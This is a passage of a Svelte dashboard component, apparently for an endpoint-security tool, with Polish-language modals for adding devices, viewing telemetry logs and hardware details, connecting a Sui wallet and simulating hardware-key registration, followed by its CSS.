      <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.65); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 1100;">
        <div class="modal-content glass-panel" style="max-width: 450px; width: 90%; padding: 24px; border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; background: rgba(15, 23, 42, 0.96); display: flex; flex-direction: column; gap: 16px;">
          <h3 style="margin: 0; font-size: 16px; font-weight: 700; color: #f1f5f9;">➕ Dodaj Urządzenie (Hydrogen Device)</h3>
          
          <div style="display: flex; flex-direction: column; gap: 12px;">
            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_devid" style="font-size: 11px; color: #94a3b8;">Nazwa / ID Urządzenia:</label>
              <input id="new_devid" type="text" bind:value={newDeviceId} placeholder="np. prod-web-01" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;" />
            </div>

            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_devtype" style="font-size: 11px; color: #94a3b8;">Typ urządzenia:</label>
              <select id="new_devtype" bind:value={newDeviceType} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;">
                <option value="Server">Server</option>
                <option value="Laptop">Laptop</option>
                <option value="IoT">IoT Device</option>
                <option value="Mobile">Mobile</option>
              </select>
            </div>

            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_devos" style="font-size: 11px; color: #94a3b8;">System operacyjny:</label>
              <input id="new_devos" type="text" bind:value={newDeviceOs} placeholder="np. AlmaLinux 9.4" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;" />
            </div>

            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_devip" style="font-size: 11px; color: #94a3b8;">Adres IP:</label>
              <input id="new_devip" type="text" bind:value={newDeviceIp} placeholder="np. 10.0.1.55" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;" />
            </div>

            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_devmac" style="font-size: 11px; color: #94a3b8;">Adres MAC:</label>
              <input id="new_devmac" type="text" bind:value={newDeviceMac} placeholder="np. 00:1A:2B:3C:4D:5E" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;" />
            </div>

            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_devuser" style="font-size: 11px; color: #94a3b8;">Przypisany użytkownik:</label>
              <select id="new_devuser" bind:value={newDeviceUser} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;">
                <option value="Brak">Brak</option>
                {#each hydrogenUsers as user}
                  <option value={user.username}>{user.username}</option>
                {/each}
              </select>
            </div>
          </div>

          <div style="display: flex; gap: 10px; justify-content: flex-end; margin-top: 10px;">
            <button style="background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #cbd5e1; padding: 8px 14px; border-radius: 8px; font-size: 12px; cursor: pointer;" on:click={() => showAddDeviceModal = false}>Anuluj</button>
            <button class="btn-primary" style="padding: 8px 14px; font-size: 12px;" on:click={handleAddDevice}>Zapisz</button>
          </div>
        </div>
      </div>
    {/if}
  </section>

  <!-- Logs Modal Overlay -->
  {#if showLogsModal}
    <div 
      class="modal-backdrop" 
      on:click={closeLogs} 
      on:keydown={(e) => { if (e.key === 'Escape' || e.key === 'Enter' || e.key === ' ') closeLogs(); }}
      role="button" 
      tabindex="0"
      aria-label="Close logs modal"
    >
      <div class="modal-content glass-panel" on:click|stopPropagation on:keydown|stopPropagation role="dialog" aria-modal="true" tabindex="-1">
        <div class="modal-header">
          <h3>
            🖥️ Real-time Telemetry Logs <span class="rpc-badge"
              >JSON-RPC 2.0</span
            >
          </h3>
          <button class="close-btn" on:click={closeLogs}>✕</button>
        </div>
        <div class="modal-body">
          <pre class="log-viewer">{liveLogs}</pre>
        </div>
      </div>
    </div>
  {/if}

  <!-- Hardware Details Modal Overlay -->
  {#if showHardwareModal}
    <div 
      class="modal-backdrop" 
      on:click={closeHardware} 
      on:keydown={(e) => { if (e.key === 'Escape' || e.key === 'Enter' || e.key === ' ') closeHardware(); }}
      role="button" 
      tabindex="0"
      aria-label="Close hardware details modal"
    >
      <div class="modal-content glass-panel" style="max-width: 800px; width: 90%; max-height: 85vh; display: flex; flex-direction: column;" on:click|stopPropagation on:keydown|stopPropagation role="dialog" aria-modal="true" tabindex="-1">
        <div class="modal-header" style="border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 16px;">
          <h3>
            🖥️ System Hardware Details <span class="rpc-badge" style="background: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.4);">Verified Telemetry</span>
          </h3>
          <button class="close-btn" on:click={closeHardware}>✕</button>
        </div>
        <div class="modal-body" style="overflow-y: auto; padding: 24px; flex: 1;">
          {#if hardwareDetails}
            <div class="hw-grid">
              
              <!-- CPU Section -->
              <div class="hw-section">
                <div class="hw-section-title">
                  <span>⚡</span> Processor (CPU)
                </div>
                <div class="hw-item">
                  <span class="hw-label">Model</span>
                  <span class="hw-value">{hardwareDetails.cpu?.model || 'Generic CPU'}</span>
                </div>
                <div class="hw-item">
                  <span class="hw-label">Logical Cores</span>
                  <span class="hw-value">{hardwareDetails.cpu?.cores || 1} Cores</span>
                </div>
                <div class="hw-item">
                  <span class="hw-label">UID / ID</span>
                  <span class="hw-uid">{hardwareDetails.cpu?.uid || 'CPU_0_ID'}</span>
                </div>
              </div>

              <!-- Memory Section -->
              <div class="hw-section">
                <div class="hw-section-title">
                  <span>💾</span> Memory (RAM)
                </div>
                <div class="hw-item">
                  <span class="hw-label">Total RAM</span>
                  <span class="hw-value">{hardwareDetails.ram?.formatted || '2.00 GB'}</span>
                </div>
                <div class="hw-item">
                  <span class="hw-label">UID</span>
                  <span class="hw-uid">{hardwareDetails.ram?.uid || 'RAM_SYS_MEM'}</span>
                </div>
              </div>

              <!-- GPU Section -->
              <div class="hw-section">
                <div class="hw-section-title">
                  <span>🎮</span> Graphics (GPU)
                </div>
                {#if hardwareDetails.gpus && hardwareDetails.gpus.length > 0}
                  <div class="hw-card-list">
                    {#each hardwareDetails.gpus as gpu}
                      <div class="hw-subcard">
                        <span class="hw-value" style="font-weight: 500;">{gpu.model}</span>
                        <span class="hw-uid">{gpu.uid}</span>
                      </div>
                    {/each}
                  </div>
                {:else}
                  <span style="color: #64748b; font-size: 13px;">No GPU detected</span>
                {/if}
              </div>

              <!-- Network Section -->
              <div class="hw-section" style="grid-column: span 2;">
                <div class="hw-section-title">
                  <span>🌐</span> Network Cards
                </div>
                {#if hardwareDetails.network_cards && hardwareDetails.network_cards.length > 0}
                  <div class="hw-card-list" style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                    {#each hardwareDetails.network_cards as net}
                      <div class="hw-subcard">
                        <span class="hw-label">{net.name}</span>
                        <span class="hw-value" style="font-family: monospace; font-size: 12px;">MAC: {net.mac}</span>
                        <span class="hw-uid">{net.uid}</span>
                      </div>
                    {/each}
                  </div>
                {:else}
                  <span style="color: #64748b; font-size: 13px;">No network interfaces</span>
                {/if}
              </div>

              <!-- Drives Section -->
              <div class="hw-section" style="grid-column: span 2;">
                <div class="hw-section-title">
                  <span>💽</span> Storage Drives
                </div>
                {#if hardwareDetails.drives && hardwareDetails.drives.length > 0}
                  <div class="hw-card-list" style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                    {#each hardwareDetails.drives as disk}
                      <div class="hw-subcard">
                        <span class="hw-label">{disk.name}</span>
                        <span class="hw-value" style="font-weight: 600;">{disk.formatted} ({disk.total_bytes} B)</span>
                        <span class="hw-uid">{disk.uid}</span>
                      </div>
                    {/each}
                  </div>
                {:else}
                  <span style="color: #64748b; font-size: 13px;">No disks detected</span>
                {/if}
              </div>

              <!-- Connected Peripherals, Printers & IoT Sensors Section -->
              <div class="hw-section" style="grid-column: span 2;">
                <div class="hw-section-title">
                  <span>🔌</span> Peripherals, Printers & IoT Sensors
                </div>
                {#if (hardwareDetails.peripherals && hardwareDetails.peripherals.length > 0) || (hardwareDetails.other && hardwareDetails.other.length > 0)}
                  <div class="hw-card-list" style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                    {#if hardwareDetails.peripherals}
                      {#each hardwareDetails.peripherals as dev}
                        <div class="hw-subcard" style="display: flex; flex-direction: column; gap: 4px; border-left: 3px solid #38bdf8;">
                          <div style="display: flex; justify-content: space-between; align-items: center;">
                            <span class="hw-value" style="font-size: 12px; font-weight: 600; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; max-width: 250px;" title={dev.name}>{dev.name}</span>
                            <span style="font-size: 10px; background: rgba(56, 189, 248, 0.15); color: #38bdf8; padding: 2px 6px; border-radius: 4px; font-weight: 500;">{dev.category || dev.type}</span>
                          </div>
                          <div style="display: flex; justify-content: space-between; align-items: center; font-size: 10px; color: #64748b;">
                            <span>Address: {dev.address || 'N/A'}</span>
                            <span class="hw-uid" style="margin: 0; padding: 0;">{dev.uid}</span>
                          </div>
                        </div>
                      {/each}
                    {/if}
                    {#if hardwareDetails.other}
                      {#each hardwareDetails.other as dev}
                        <div class="hw-subcard" style="display: flex; flex-direction: column; gap: 4px; border-left: 3px solid #64748b;">
                          <div style="display: flex; justify-content: space-between; align-items: center;">
                            <span class="hw-value" style="font-size: 12px; font-weight: 600; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; max-width: 250px;" title={dev.name}>{dev.name}</span>
                            <span style="font-size: 10px; background: rgba(255, 255, 255, 0.05); color: #94a3b8; padding: 2px 6px; border-radius: 4px; font-weight: 500;">PCI / Motherboard</span>
                          </div>
                          <div style="display: flex; justify-content: space-between; align-items: center; font-size: 10px; color: #64748b;">
                            <span>Slot Interface</span>
                            <span class="hw-uid" style="margin: 0; padding: 0;">{dev.uid}</span>
                          </div>
                        </div>
                      {/each}
                    {/if}
                  </div>
                {:else}
                  <span style="color: #64748b; font-size: 13px;">No external peripherals or IoT sensors detected</span>
                {/if}
              </div>

            </div>
          {:else}
            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; color: #94a3b8; gap: 12px;">
              <span style="font-size: 32px;">⚠️</span>
              <p>Hardware information is loading or agent is offline.</p>
            </div>
          {/if}
        </div>
      </div>
    </div>
  {/if}

  <!-- Sui Wallet Connection Modal -->
  {#if showWalletModal}
    <div 
      class="modal-backdrop" 
      on:click={() => (showWalletModal = false)} 
      on:keydown={(e) => { if (e.key === 'Escape') showWalletModal = false; }}
      role="button" 
      tabindex="0"
      aria-label="Close wallet selection modal"
    >
      <div class="modal-content glass-panel" style="max-width: 450px; width: 90%; padding: 28px;" on:click|stopPropagation on:keydown|stopPropagation role="dialog" aria-modal="true" tabindex="-1">
        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 16px; margin-bottom: 20px;">
          <h3 style="margin: 0; font-size: 18px; font-weight: 700; color: #f1f5f9; display: flex; align-items: center; gap: 8px;">
            🔌 Połącz Portfel Sui
          </h3>
          <button style="background: none; border: none; color: #94a3b8; font-size: 18px; cursor: pointer;" on:click={() => (showWalletModal = false)}>✕</button>
        </div>

        {#if slushWalletAlert}
          <div style="background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #f87171; padding: 12px; border-radius: 6px; font-size: 12px; margin-bottom: 16px;">
            ⚠️ {slushWalletAlert}
          </div>
        {/if}

        <p style="font-size: 13px; color: #94a3b8; margin: 0 0 16px 0; line-height: 1.4;">
          Wykryte rozszerzenia portfeli Sui w Twojej przeglądarce. Wybierz portfel, aby podpisać żądanie klucza Sui Seal (Foka).
        </p>

        <div style="display: flex; flex-direction: column; gap: 10px;">
          {#each availableWallets as wallet}
            <button 
              style="display: flex; justify-content: space-between; align-items: center; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); padding: 14px 18px; border-radius: 8px; color: white; cursor: pointer; text-align: left; font-size: 14px; font-weight: 600; transition: all 0.2s;"
              on:click={() => connectWallet(wallet)}
              disabled={connectingSlush}
            >
              <div style="display: flex; align-items: center; gap: 10px;">
                <span style="font-size: 18px;">🔑</span>
                <span>{wallet.name}</span>
              </div>
              <span style="font-size: 11px; background: rgba(16, 185, 129, 0.15); color: #10b981; padding: 2px 6px; border-radius: 4px; font-weight: 500;">Dostępny</span>
            </button>
          {/each}

          {#if availableWallets.length === 0}
            <div style="background: rgba(255, 255, 255, 0.01); border: 1px dashed rgba(255, 255, 255, 0.08); padding: 16px; border-radius: 8px; text-align: center; color: #64748b; font-size: 13px; margin-bottom: 8px;">
              Brak aktywnych rozszerzeń portfela Sui (np. Slush Wallet, Sui Wallet) w przeglądarce.
            </div>
          {/if}

          <!-- Dev Wallet Fallback -->
          <div style="border-top: 1px solid rgba(255, 255, 255, 0.05); margin-top: 10px; padding-top: 16px;">
            <span style="font-size: 11px; color: #64748b; text-transform: uppercase; font-weight: 700; display: block; margin-bottom: 8px;">Tryb Deweloperski (Testowy)</span>
            <button 
              style="width: 100%; display: flex; align-items: center; gap: 10px; background: rgba(56, 189, 248, 0.05); border: 1px dashed rgba(56, 189, 248, 0.3); padding: 14px 18px; border-radius: 8px; color: #38bdf8; cursor: pointer; text-align: left; font-size: 14px; font-weight: 600; transition: all 0.2s;"
              on:click={() => connectWallet({ name: "Dev Wallet (Slush Sim)", type: "dev" })}
              disabled={connectingSlush}
            >
              <span style="font-size: 18px;">❄️</span>
              <div style="display: flex; flex-direction: column;">
                <span>Simulate Slush Wallet</span>
                <span style="font-size: 10px; color: #64748b; font-weight: normal; margin-top: 2px;">0x8dba...ab55</span>
              </div>
            </button>
          </div>
        </div>
      </div>
    </div>
  {/if}

  <!-- Foka Verification Modal Overlay -->
  {#if showFokaVerificationModal}
    <div 
      class="modal-backdrop" 
      on:click={closeFokaVerification} 
      on:keydown={(e) => { if (e.key === 'Escape' || e.key === 'Enter' || e.key === ' ') closeFokaVerification(); }}
      role="button" 
      tabindex="0"
      aria-label="Close Foka verification modal"
    >
      <div class="modal-content glass-panel" style="max-width: 550px; width: 90%; text-align: center; padding: 32px;" on:click|stopPropagation on:keydown|stopPropagation role="dialog" aria-modal="true" tabindex="-1">
        <div style="font-size: 48px; margin-bottom: 16px;">🦭</div>
        <h3 style="margin-top: 0; font-size: 20px; font-weight: 700; color: #f1f5f9;">Weryfikacja Foki (Sui Seal)</h3>
        <p style="font-size: 14px; color: #94a3b8; margin: 8px 0 24px 0;">
          Identyfikator raportu: <code style="color: #38bdf8; font-family: monospace;">{verifyingInferenceId}</code>
        </p>

        <div style="background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.05); padding: 20px; border-radius: 8px; margin-bottom: 24px; min-height: 80px; display: flex; align-items: center; justify-content: center; font-size: 14px; color: #e2e8f0; font-weight: 500; line-height: 1.5;">
          {#if verificationStatus && verificationStatus.includes("Weryfikowanie")}
            <div style="display: flex; flex-direction: column; align-items: center; gap: 12px;">
              <div style="width: 24px; height: 24px; border: 3px solid rgba(56, 189, 248, 0.2); border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite;"></div>
              <span>{verificationStatus}</span>
            </div>
          {:else}
            <span style="color: #10b981;">{verificationStatus}</span>
          {/if}
        </div>

        <button class="btn-primary" style="width: 100%; padding: 12px; font-size: 14px; font-weight: 600;" on:click={closeFokaVerification}>
          Zamknij okno
        </button>
      </div>
    </div>
  {/if}

  <!-- Hardware Key Registration Simulation Overlay -->
  {#if isRegisteringHardware}
    <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.75); backdrop-filter: blur(5px); display: flex; align-items: center; justify-content: center; z-index: 1200;">
      <div class="glass-panel" style="max-width: 380px; width: 90%; padding: 30px; border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 20px; background: rgba(10, 15, 30, 0.95); display: flex; flex-direction: column; align-items: center; gap: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
        <div class="spinner-container" style="position: relative; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center;">
          <div style="position: absolute; width: 100%; height: 100%; border: 4px solid rgba(59, 130, 246, 0.1); border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite;"></div>
          <span style="font-size: 32px;">{hardwareRegisterType === 'yubikey' ? '🔑' : '🛡️'}</span>
        </div>
        
        <div>
          <h4 style="margin: 0 0 8px 0; color: #f1f5f9; font-size: 16px; font-weight: 700;">Rejestracja Klucza Sprzętowego</h4>
          <p style="margin: 0; font-size: 13px; color: #94a3b8; line-height: 1.5;">
            {#if hardwareRegisterType === 'yubikey'}
              Oczekiwanie na interakcję. Proszę włożyć klucz <strong>YubiKey</strong> do portu USB i dotknąć złotego styku...
            {:else}
              Oczekiwanie na interakcję. Proszę podłączyć <strong>FIDO2 Security Key</strong> i potwierdzić dotknięciem...
            {/if}
          </p>
        </div>
        
        <span style="font-size: 11px; color: #3b82f6; font-family: monospace; letter-spacing: 1px; text-transform: uppercase;">Symulacja WebAuthn / FIDO2</span>
      </div>
    </div>
  {/if}
</main>

<style>
  .vm-tab-panel {
    flex: 1;
    overflow-y: auto;
    padding: 0 4px;
    display: flex;
    flex-direction: column;
  }

  .dashboard {
    display: flex;
    height: 100vh;
    width: 100vw;
    overflow: hidden;
    background: radial-gradient(circle at top right, #1e1b4b 0%, #0b0f19 50%);
  }

  .sidebar {
    width: 280px;
    height: 100%;
    border-radius: 0;
    border-top: none;
    border-bottom: none;
    border-left: none;
    display: flex;
    flex-direction: column;
    padding: 24px;
    z-index: 10;
  }

  .logo-container {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 48px;
  }

  .logo-icon {
    font-size: 32px;
  }

  .logo-text {
    margin: 0;
    font-size: 24px;
    font-weight: 800;
    letter-spacing: -0.5px;
  }

  .accent {
    color: #38bdf8;
  }

  .nav-menu {
    display: flex;
    flex-direction: column;
    gap: 8px;
    flex: 1;
  }

  .nav-item {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px 16px;
    background: transparent;
    border: none;
    color: #94a3b8;
    font-size: 16px;
    font-weight: 500;
    border-radius: 8px;
    cursor: pointer;
    text-align: left;
    transition: all 0.2s;
  }

  .nav-item:hover {
    background: rgba(255, 255, 255, 0.05);
    color: #f8fafc;
  }

  .nav-item.active {
    background: rgba(56, 189, 248, 0.1);
    color: #38bdf8;
    border-left: 3px solid #38bdf8;
  }

  .network-status {
    padding: 16px;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 12px;
    font-size: 14px;
    color: #94a3b8;
    display: flex;
    flex-direction: column;
    gap: 8px;
  }

  .status-dot {
    width: 8px;
    height: 8px;
    background: #10b981;
    border-radius: 50%;
    box-shadow: 0 0 10px #10b981;
    display: inline-block;
    margin-right: 8px;
  }

  .contract-address {
    font-family: monospace;
    font-size: 12px;
    color: #64748b;
    word-break: break-all;
  }

  .content {
    flex: 1;
    overflow-y: auto;
    padding: 32px 48px;
  }

  .top-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 40px;
  }

  .top-bar h2 {
    margin: 0;
    font-size: 28px;
    font-weight: 700;
  }

  .user-profile {
    display: flex;
    align-items: center;
    gap: 12px;
    background: rgba(255, 255, 255, 0.05);
    padding: 8px 16px;
    border-radius: 20px;
    font-weight: 500;
  }

  .stats-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 24px;
    margin-bottom: 32px;
  }

  .stat-card {
    padding: 24px;
    display: flex;
    flex-direction: column;
    gap: 8px;
  }

  .alert-pulse {
    animation: pulse-red 2s infinite;
    border-color: rgba(239, 68, 68, 0.5);
  }

  .text-red {
    color: #ef4444;
  }

  .stat-title {
    color: #94a3b8;
    font-size: 14px;
    font-weight: 500;
  }

  .stat-value {
    font-size: 36px;
    font-weight: 700;
  }

  .stat-trend {
    font-size: 13px;
  }

  .positive {
    color: #10b981;
  }
  .negative {
    color: #ef4444;
  }
  .neutral {
    color: #64748b;
  }

  .panels-grid {
    display: grid;
    grid-template-columns: 1.8fr 1.2fr;
    gap: 24px;
  }

  .panel {
    padding: 24px;
    display: flex;
    flex-direction: column;
    gap: 20px;
  }

  .panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    padding-bottom: 16px;
  }

  .panel-header h3 {
    margin: 0;
    font-size: 18px;
    font-weight: 600;
  }

  .incident-list {
    display: flex;
    flex-direction: column;
    gap: 12px;
  }

  .incident-row {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 16px;
    background: rgba(0, 0, 0, 0.2);
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.05);
  }

  .incident-details {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  .incident-cmd code {
    background: rgba(239, 68, 68, 0.1);
    color: #fca5a5;
    padding: 4px 8px;
    border-radius: 4px;
    font-family: "JetBrains Mono", monospace;
    font-size: 14px;
  }

  .incident-meta {
    font-size: 13px;
    color: #94a3b8;
  }

  .action-text {
    color: #f59e0b;
    font-weight: 600;
  }

  .incident-time {
    color: #64748b;
    font-size: 13px;
    white-space: nowrap;
  }

  .severity-badge {
    padding: 4px 8px;
    border-radius: 4px;
    font-size: 11px;
    font-weight: 800;
    letter-spacing: 0.5px;
  }

  .severity-badge.critical {
    background: #ef4444;
    color: white;
  }
  .severity-badge.high {
    background: #f97316;
    color: white;
  }
  .severity-badge.warning {
    background: #eab308;
    color: #422006;
  }

  .agent-list {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 16px;
  }

  .agent-card {
    background: rgba(0, 0, 0, 0.2);
    border: 1px solid rgba(255, 255, 255, 0.05);
    border-radius: 8px;
    padding: 16px;
    display: flex;
    flex-direction: column;
    gap: 16px;
  }

  .agent-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .agent-id {
    font-weight: 600;
    font-family: monospace;
    color: #e2e8f0;
  }

  .agent-status {
    font-size: 12px;
    font-weight: 600;
    padding: 4px 8px;
    border-radius: 12px;
  }

  .agent-status.active {
    background: rgba(16, 185, 129, 0.2);
    color: #10b981;
  }
  .agent-status.isolated {
    background: rgba(239, 68, 68, 0.2);
    color: #ef4444;
  }

  .agent-body {
    font-size: 13px;
    color: #cbd5e1;
    display: flex;
    flex-direction: column;
    gap: 12px;
  }

  .agent-body code {
    color: #38bdf8;
    background: rgba(56, 189, 248, 0.1);
    padding: 2px 6px;
    border-radius: 4px;
  }

  .load-bar-container {
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .load-bar {
    flex: 1;
    height: 6px;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 3px;
    overflow: hidden;
  }

  .load-fill {
    height: 100%;
    background: linear-gradient(90deg, #38bdf8, #818cf8);
    border-radius: 3px;
  }

  .agent-actions {
    display: flex;
    justify-content: flex-end;
  }

  .modal-backdrop {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.7);
    backdrop-filter: blur(4px);
    z-index: 100;
    display: flex;
    justify-content: center;
    align-items: center;
    animation: slideIn 0.2s ease-out;
  }

  .modal-content {
    width: 80%;
    max-width: 900px;
    height: 70vh;
    display: flex;
    flex-direction: column;
  }

  .modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 16px 24px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  }

  .modal-header h3 {
    margin: 0;
    font-size: 18px;
    color: #38bdf8;
    display: flex;
    align-items: center;
  }

  .rpc-badge {
    background: rgba(16, 185, 129, 0.2);
    color: #10b981;
    border: 1px solid rgba(16, 185, 129, 0.5);
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
    font-weight: 700;
    margin-left: 10px;
    letter-spacing: 0.5px;
    text-transform: uppercase;
  }

  .close-btn {
    background: none;
    border: none;
    color: #94a3b8;
    font-size: 20px;
    cursor: pointer;
  }

  .close-btn:hover {
    color: white;
  }

  .modal-body {
    flex: 1;
    padding: 16px;
    overflow: hidden;
  }

  .log-viewer {
    background: #0f172a;
    color: #34d399;
    font-family: "JetBrains Mono", monospace;
    font-size: 13px;
    height: 100%;
    overflow-y: auto;
    padding: 16px;
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.05);
    margin: 0;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .hw-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
  }

  .hw-section {
    background: rgba(255, 255, 255, 0.02);
    border: 1px solid rgba(255, 255, 255, 0.05);
    border-radius: 12px;
    padding: 16px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .hw-section-title {
    font-size: 14px;
    font-weight: 700;
    color: #f8fafc;
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    padding-bottom: 8px;
    margin-bottom: 4px;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .hw-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 13px;
  }

  .hw-label {
    color: #94a3b8;
  }

  .hw-value {
    color: #f1f5f9;
    font-weight: 500;
  }

  .hw-uid {
    font-family: monospace;
    font-size: 11px;
    color: #64748b;
    background: rgba(255, 255, 255, 0.03);
    padding: 2px 6px;
    border-radius: 4px;
  }

  .hw-card-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
  }

  .hw-subcard {
    background: rgba(0, 0, 0, 0.2);
    border: 1px solid rgba(255, 255, 255, 0.03);
    border-radius: 8px;
    padding: 10px;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>
